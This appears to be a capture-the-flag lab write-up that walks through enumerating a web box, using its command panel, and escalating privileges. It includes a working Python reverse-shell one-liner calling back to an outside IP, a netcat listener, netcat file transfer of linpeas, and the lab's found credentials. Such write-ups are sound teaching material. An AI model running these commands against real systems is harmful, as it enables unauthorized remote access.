# Methodology

## Preparation
```bash
export IP="10.10.0.22"
```

## Port enumeration
```bash
mkdir -p nmap
nmap -v -sC -sV -oN nmap/initial $IP
nmap -v -p- -oN nmap/all_ports $IP
```

## HTTP File enumeration
```bash
mkdir -p gobuster
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster/medium_list -x php,sh,cgi,txt,html,js,css,py
```

## Web interaction

### Login
http://$IP/login.php
> Use username and password found

### Commands

**Use the command panel**
http://$IP/portal.php

**Gather information**
```bash
ls
```
> list directory files

```bash
grep -R .
```
> read file content

**Test executable commands**
``` bash
python3 -c "print('hello')"
```
> test executable commands availability

## Prepare exploit

### Using python
``` bash
# get local IP
ip a show tun0

# Remote exploit
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.30.23",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Local listener
nc -lvnp 9999

# Establish stable bash using python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Establish stable bash using STTY
ctrl-z

```

## Privilege escalation

### Using linpeas
```bash
# upload linpeas.sh using netcat

# remote
nc -lp 4444 > /dev/shm/lin.sh
# local
nc -w 3 $IP 4444 < linpeas.sh

# using Linpeas.sh to enumerate possible privilege escalation
bash /dev/shm/lin.sh
```

# Findings
R1ckRul3s
> View page source from http://$IP

Wubbalubbadubdub
> Web page content from http://$IP/robots.txt





# Tips

## Display all file contents

### Using grep
```bash
grep -R .

grep . clue.txt
```

### Using while
```bash
while read line; do echo $line; done < clue.txt
```




# New Tools

### Nikto
```bash
mkdir nikto
nikto -h http://$IP | tee nikto/results
```

### Revershell codes
> https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### John Hammond ready made tools
https://github.com/JohnHammond/poor-mans-pentest